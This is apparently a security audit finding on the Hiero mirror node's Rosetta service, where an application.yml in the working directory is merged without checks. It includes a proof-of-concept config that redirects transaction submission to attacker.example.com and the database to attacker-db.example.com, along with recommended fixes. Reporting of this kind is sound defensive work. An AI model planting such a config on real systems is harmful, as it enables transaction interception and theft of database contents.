### Title
Malicious `application.yml` in CWD Overrides Gossip Node Configuration via Unconditional `v.AddConfigPath(".")`

### Summary
`LoadConfig()` in `rosetta/app/config/config.go` unconditionally calls `v.AddConfigPath(".")` followed by `mergeExternalConfigFile(v)`, which loads and merges any `application.yml` found in the process's current working directory with no integrity, ownership, or path-restriction checks. In deployments using shared filesystems or writable container volume mounts — a pattern explicitly documented and used in CI — an attacker with write access to that shared path can place a crafted `application.yml` that overrides `hiero.mirror.rosetta.nodes`, redirecting all gossip transaction submissions to attacker-controlled Hedera nodes.

### Finding Description

**Exact code path:**

`rosetta/app/config/config.go`, `LoadConfig()`, lines 59–64:
```go
// load configuration file from current directory
v.SetConfigName(configName)
v.AddConfigPath(".")
if err := mergeExternalConfigFile(v); err != nil {
    return nil, err
}
``` [1](#0-0) 

`mergeExternalConfigFile` calls `v.MergeInConfig()` with no validation of file ownership, integrity, or signature: [2](#0-1) 

The only guard is a `ConfigFileNotFoundError` check — if the file exists, it is merged unconditionally.

**CWD at runtime:**

- Standalone container (`rosetta/Dockerfile`): `WORKDIR /app`, process runs as `USER 1000:1000`. [3](#0-2) 

- All-in-one container (`rosetta/container/supervisord-offline.conf`): `directory=/app/rosetta/`, process runs as user `rosetta`. [4](#0-3) 

**Documented deployment pattern mounts directly into the CWD:**

The CI workflow mounts `-v .../application_rosetta.yml:/app/rosetta/application.yml`, placing the config file exactly at the path viper will load: [5](#0-4) 

The README similarly instructs users to mount `application.yml` into `/app/importer/application.yml` (the importer CWD): [6](#0-5) 

**Gossip redirection path:**

The loaded `Nodes` field (`NodeMap`) is passed directly to `hiero.ClientForNetworkV2(config.Rosetta.Nodes)` in `NewConstructionAPIService`, which creates the SDK client used for all transaction submissions: [7](#0-6) 

The `Config` struct exposes `Nodes NodeMap`, `Db Db` (host/password/username), and all other runtime parameters as overridable YAML keys: [8](#0-7) 

**Why existing checks fail:**

`mergeExternalConfigFile` only suppresses `ConfigFileNotFoundError`; any file that exists and is valid YAML is merged without checking who wrote it, when, or whether it was tampered with. There is no file-permission assertion, no cryptographic signature, and no allowlist of trusted config paths. [2](#0-1) 

### Impact Explanation

An attacker who can write `application.yml` to the Rosetta process's CWD can:

1. **Redirect gossip**: Override `hiero.mirror.rosetta.nodes` with attacker-controlled IP:port → account-ID mappings. All `/construction/submit` calls will send signed transactions to the attacker's node instead of the legitimate Hedera network, enabling transaction interception, suppression, or replay.
2. **Steal DB credentials**: Override `hiero.mirror.rosetta.db.host`, `db.password`, `db.username` to redirect the mirror node's database connection to an attacker-controlled PostgreSQL instance, exfiltrating all mirrored ledger data.
3. **Denial of service**: Supply an invalid `db.host` or malformed `nodes` map to crash the service on next restart.

Severity: **High** — direct protocol-level impact on transaction routing integrity.

### Likelihood Explanation

The attack requires write access to the CWD inside the container. This is realistic in:

- **Shared Docker/Kubernetes volumes**: If the volume backing `/app/rosetta/` is a shared PVC, NFS mount, or `hostPath` volume accessible to other pods or OS users, any tenant with write access can drop the file.
- **Misconfigured volume mounts**: The documented deployment pattern (`-v host_path:/app/rosetta/application.yml`) means operators routinely bind-mount host directories into the CWD. If the host directory is world-writable or shared, the attack is trivial.
- **Container escape or co-located workload**: In multi-tenant clusters without strict namespace isolation, a compromised co-located container sharing the same volume can write the file.
- **No restart required**: The config is loaded at startup; the attacker only needs to place the file before the next process restart (e.g., after a crash loop or rolling update).

The attack requires no network access to the Rosetta API and no Hedera credentials — only filesystem write access to one directory.

### Recommendation

1. **Remove `v.AddConfigPath(".")`** and rely solely on the explicit `HIERO_MIRROR_ROSETTA_API_CONFIG` environment variable for external config. This eliminates the implicit CWD lookup entirely.
2. If CWD loading must be retained, **validate file ownership and permissions** before loading: reject any `application.yml` not owned by the process's UID or writable by group/other.
3. **Mount config as read-only** in all container deployments (`:ro` flag on Docker volume mounts; `readOnly: true` in Kubernetes `volumeMounts`).
4. **Use Kubernetes Secrets or ConfigMaps with `defaultMode: 0400`** (already partially done in the Helm chart) and ensure the mount path is not the process CWD. [9](#0-8) 

### Proof of Concept

**Preconditions**: Rosetta container uses the all-in-one image; attacker has write access to the host directory bind-mounted to `/app/rosetta/` (e.g., a shared NFS export or a world-writable `hostPath`).

**Steps**:

1. On the shared/host filesystem, create a malicious config:
```yaml
# /shared/application.yml
hiero:
  mirror:
    rosetta:
      nodes:
        "attacker.example.com:50211": "0.0.3"
      db:
        host: attacker-db.example.com
        password: stolen
```

2. Place it at the bind-mounted path that maps to `/app/rosetta/application.yml` inside the container (or directly write to the shared volume at that path).

3. Trigger a Rosetta process restart (wait for crash-loop, rolling update, or send SIGTERM if any signal path is accessible).

4. On restart, `LoadConfig()` executes `v.AddConfigPath(".")`, finds `application.yml` in `/app/rosetta/`, and `mergeExternalConfigFile` merges it over the embedded defaults.

5. `NewConstructionAPIService` calls `hiero.ClientForNetworkV2({"attacker.example.com:50211": 0.0.3})` — all subsequent `/construction/submit` requests route signed transactions to the attacker's node.

func mergeExternalConfigFile(v *viper.Viper) error {
	if err := v.MergeInConfig(); err != nil {
		if _, ok := err.(viper.ConfigFileNotFoundError); !ok {
			return err
		}

		log.Info("External configuration file not found")
		return nil
	}

	log.Infof("Loaded external config file: %s", v.ConfigFileUsed())
	return nil
}
